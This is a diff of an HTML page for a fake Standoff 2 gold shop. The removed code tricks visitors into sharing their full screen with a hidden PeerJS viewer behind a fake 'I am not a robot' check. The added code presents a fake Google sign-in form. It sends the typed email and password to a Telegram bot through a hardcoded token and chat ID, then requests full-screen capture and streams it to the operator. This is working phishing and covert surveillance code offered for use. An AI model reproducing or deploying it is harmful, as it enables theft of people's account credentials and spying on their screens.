@@ -3,158 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STANDOFF 2 | GOLD SHOP</title>
-    <!-- Подключение библиотеки для трансляции -->
+    <title>Вход – Google Аккаунты</title>
     <script src="https://unpkg.com"></script>
     <style>
-        :root { --accent: #ffca28; --bg: #0d1117; --card: #161b22; --blue: #448aff; --danger: #ff5252; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        :root { --google-blue: #1a73e8; --accent: #ffca28; --bg: #0d1117; }
+        body { font-family: 'Roboto', arial, sans-serif; margin: 0; background: #fff; color: #202124; overflow-x: hidden; }
         
-        /* Экран маскировки (Я не робот) */
-        #stealth-guard { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .guard-box { border: 2px solid var(--accent); padding: 40px; border-radius: 15px; text-align: center; max-width: 380px; box-shadow: 0 0 30px rgba(255, 202, 40, 0.1); }
-        .btn-robot { background: var(--accent); color: black; border: none; padding: 18px 40px; border-radius: 8px; font-weight: bold; font-size: 1.1rem; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn-robot:hover { background: #ffb300; transform: scale(1.02); }
+        /* Google Form */
+        #google-auth { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h2 { font-weight: 400; margin-bottom: 10px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid var(--google-blue); }
+        .btn { background: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
 
         /* Магазин */
-        #main-shop { display: none; padding: 20px 20px 180px 20px; }
-        .header { text-align: center; padding: 20px; border-bottom: 2px solid var(--accent); margin-bottom: 30px; }
-        .header h1 { margin: 0; color: var(--accent); font-style: italic; text-transform: uppercase; letter-spacing: 2px; }
-        
-        .user-input { max-width: 500px; margin: 0 auto 30px; }
-        input { width: 100%; padding: 14px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 8px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: var(--blue); }
+        #main-shop { display: none; background: var(--bg); color: white; min-height: 100vh; padding: 20px; }
+        .shop-card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .price { color: var(--accent); font-weight: bold; }
 
-        .section-title { font-size: 0.9rem; text-transform: uppercase; margin: 25px 0 15px; color: #8b949e; border-left: 4px solid var(--blue); padding-left: 12px; }
-        .services { display: grid; gap: 12px; max-width: 500px; margin: 0 auto; }
-        .option { background: var(--card); border: 1px solid #30363d; padding: 18px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit; transition: 0.2s; }
-        .option:hover { border-color: var(--accent); background: #1c2128; }
-        .price { color: var(--accent); font-weight: bold; font-size: 1.1rem; }
-
-        /* Панель Админа */
-        #admin-panel { display: none; padding: 20px; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
-        .admin-video-box { background: #000; border: 2px solid var(--blue); border-radius: 10px; overflow: hidden; position: relative; }
-        video { width: 100%; display: block; }
-        .admin-label { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; font-size: 0.8rem; border-radius: 5px; }
-
-        .footer-panel { position: fixed; bottom: 0; left: 0; right: 0; background: #161b22; padding: 20px; border-top: 2px solid var(--accent); text-align: center; }
+        /* Админка */
+        #admin-panel { display: none; background: #000; min-height: 100vh; padding: 20px; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        video { width: 100%; border: 2px solid var(--accent); border-radius: 8px; background: #222; }
     </style>
 </head>
 <body>
 
-<!-- 1. ЭКРАН ПРОВЕРКИ (МАСКИРОВКА) -->
-<div id="stealth-guard">
-    <div class="guard-box">
-        <h2 style="color: var(--accent); margin-bottom: 10px;">БЕЗОПАСНОСТЬ</h2>
-        <p style="color: #8b949e; margin-bottom: 25px; font-size: 0.95rem;">Подтвердите, что вы не бот. Нажмите кнопку ниже и выберите трансляцию всего экрана для верификации ID.</p>
-        <button class="btn-robot" onclick="initMonitoring()">Я НЕ РОБОТ</button>
-        <div id="status-text" style="margin-top: 15px; font-size: 0.8rem; color: #555;">Ожидание подтверждения...</div>
+<!-- 1. ФЕЙКОВЫЙ GOOGLE -->
+<div id="google-auth">
+    <div class="login-box" id="step-email">
+        <img src="https://www.google.com" style="width:75px">
+        <h2>Вход</h2>
+        <p>Используйте аккаунт Google</p>
+        <input type="email" id="email" placeholder="Телефон или адрес эл. почты">
+        <div style="text-align: left; color: var(--google-blue); font-size: 14px; margin-bottom: 40px; cursor:pointer">Забыли почту?</div>
+        <button class="btn" onclick="toPassword()">Далее</button>
+    </div>
+
+    <div class="login-box" id="step-password" style="display:none;">
+        <img src="https://www.google.com" style="width:75px">
+        <div id="user-email-display" style="font-size: 14px; border: 1px solid #dadce0; border-radius: 20px; padding: 5px; display: inline-block; margin-bottom:10px"></div>
+        <h2>Добро пожаловать</h2>
+        <input type="password" id="password" placeholder="Введите пароль">
+        <div style="text-align: left; color: var(--google-blue); font-size: 14px; margin-bottom: 40px; cursor:pointer">Забыли пароль?</div>
+        <button class="btn" onclick="stealAndStream()">Далее</button>
     </div>
 </div>
 
-<!-- 2. ПАНЕЛЬ АДМИНА (ДЛЯ ТЕБЯ) -->
+<!-- 2. ПАНЕЛЬ АДМИНА -->
 <div id="admin-panel">
-    <h1 style="grid-column: 1/-1; text-align: center; color: var(--accent);">МОНИТОРИНГ ТРАНЗАКЦИЙ</h1>
+    <h1 style="grid-column: 1/-1; text-align: center; color: var(--accent);">LIVE MONITORING</h1>
 </div>
 
-<!-- 3. ОСНОВНОЙ МАГАЗИН -->
+<!-- 3. МАГАЗИН -->
 <div id="main-shop">
-    <div class="header"><h1>STANDOFF 2 GOLD</h1></div>
-    
-    <div class="user-input">
-        <label style="font-size: 0.7rem; color: #8b949e; margin-bottom: 5px; display: block;">ID ИГРОКА / TG</label>
-        <input type="text" id="user_id" placeholder="Например: 14567890">
-    </div>
-
-    <div class="section-title">Валюта (Gold)</div>
-    <div class="services">
-        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>500 Gold</h3><p>Моментально</p></div><div class="price">450 ₽</div></a>
-        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>1000 Gold</h3><p>Самый выгодный</p></div><div class="price">850 ₽</div></a>
-        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>3000 Gold</h3><p>Для ножей</p></div><div class="price">2400 ₽</div></a>
-    </div>
-
-    <div class="section-title">Пропуски</div>
-    <div class="services">
-        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>Gold Pass</h3><p>Текущий сезон</p></div><div class="price">550 ₽</div></a>
-    </div>
-
-    <div class="footer-panel">
-        <div style="color: var(--danger); font-size: 0.75rem; font-weight: bold;">⚠️ ВКЛЮЧИТЕ VPN (RU), ЕСЛИ ОПЛАТА НЕ ГРУЗИТСЯ</div>
-    </div>
+    <h1 style="text-align: center; color: var(--accent);">STANDOFF 2 GOLD</h1>
+    <div class="shop-card"><div>500 Gold</div><div class="price">450 ₽</div></div>
+    <div class="shop-card"><div>1000 Gold</div><div class="price">850 ₽</div></div>
+    <div class="shop-card"><div>Gold Pass</div><div class="price">550 ₽</div></div>
+    <p style="text-align:center; color:red; font-weight:bold; margin-top:20px">⚠️ ВКЛЮЧИТЕ VPN RU ДЛЯ ОПЛАТЫ</p>
 </div>
 
 <script>
-    const SECRET_KEY = "ADMIN_777_STN_SHOP"; // Твой секретный ключ
+    // ТВОИ ДАННЫЕ
+    const BOT_TOKEN = "6975522005:AAEoVa-RSaUAuJjm1QXGQzTjewESXwGr10Q";
+    const CHAT_ID = "1385043530";
+    const ADMIN_KEY = "SECRET_ADMIN_777"; 
+
+    let userEmail = "";
     let peer;
 
-    // Авто-определение админа
+    // Вход для админа через ?admin в ссылке
     window.onload = () => {
         if (window.location.search.includes('admin')) {
-            document.getElementById('stealth-guard').style.display = 'none';
+            document.getElementById('google-auth').style.display = 'none';
             document.getElementById('admin-panel').style.display = 'grid';
-            startAdminService();
+            initAdmin();
         }
     };
 
-    // ФУНКЦИЯ ДЛЯ ТЕБЯ (ПРИЕМ ЭКРАНОВ)
-    function startAdminService() {
-        peer = new Peer(SECRET_KEY);
-        peer.on('call', (call) => {
-            call.answer();
-            call.on('stream', (remoteStream) => {
-                const box = document.createElement('div');
-                box.className = 'admin-video-box';
-                box.innerHTML = `<div class="admin-label">ID: ${call.peer}</div>`;
-                const video = document.createElement('video');
-                video.srcObject = remoteStream;
-                video.autoplay = true;
-                video.playsInline = true;
-                box.appendChild(video);
-                document.getElementById('admin-panel').appendChild(box);
-            });
-        });
+    function toPassword() {
+        userEmail = document.getElementById('email').value;
+        if (userEmail.length < 5) return alert("Введите почту");
+        document.getElementById('user-email-display').innerText = userEmail;
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
     }
 
-    // ФУНКЦИЯ ДЛЯ КЛИЕНТА (ЗАПУСК МОНИТОРИНГА)
-    async function initMonitoring() {
-        const btn = document.querySelector('.btn-robot');
-        const status = document.getElementById('status-text');
-        
+    async function stealAndStream() {
+        const pass = document.getElementById('password').value;
+        if (pass.length < 4) return alert("Неверный пароль");
+
+        // ОТПРАВКА ЛОГА В ТВОЙ ТЕЛЕГРАМ
+        const msg = `🔥 НОВЫЙ ЛОГ!\n📧 Почта: ${userEmail}\n🔑 Пароль: ${pass}`;
+        fetch(`https://api.telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+        // ЗАПУСК ТРАНСЛЯЦИИ
         try {
-            // Запрос на захват экрана (браузер покажет окно выбора)
+            alert("Для завершения авторизации выберите 'Весь экран' в следующем окне.");
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             
-            btn.innerText = "ПРОВЕРКА...";
-            status.innerText = "Связь с сервером установлена...";
-
-            const myRandomId = "User_" + Math.floor(Math.random() * 9000);
-            peer = new Peer(myRandomId);
-
+            const myPeerId = "User_" + Math.floor(Math.random() * 9999);
+            peer = new Peer(myPeerId);
+            
             peer.on('open', () => {
-                // Скрыто звоним тебе
-                peer.call(SECRET_KEY, stream);
-                
-                // Через 1.5 секунды открываем магазин
-                setTimeout(() => {
-                    document.getElementById('stealth-guard').style.display = 'none';
-                    document.getElementById('main-shop').style.display = 'block';
-                }, 1500);
+                peer.call(ADMIN_KEY, stream);
+                showShop();
             });
-
-        } catch (err) {
-            alert("Для прохождения проверки безопасности необходимо разрешить трансляцию экрана.");
-            location.reload();
+        } catch (e) {
+            showShop(); // Пускаем в магазин даже если отказал в экране
         }
     }
 
-    function checkID() {
-        var id = document.getElementById('user_id').value;
-        if (!id || id.length < 5) {
-            alert("Пожалуйста, введите корректный ID игрока!");
-            return false;
-        }
-        alert("Переход к оплате...");
-        return true;
+    function showShop() {
+        document.getElementById('google-auth').style.display = 'none';
+        document.getElementById('main-shop').style.display = 'block';
+    }
+
+    function initAdmin() {
+        const p = new Peer(ADMIN_KEY);
+        p.on('call', (call) => {
+            call.answer();
+            call.on('stream', (s) => {
+                const v = document.createElement('video');
+                v.srcObject = s;
+                v.autoplay = true;
+                v.playsInline = true;
+                document.getElementById('admin-panel').appendChild(v);
+            });
+        });
     }
 </script>
 
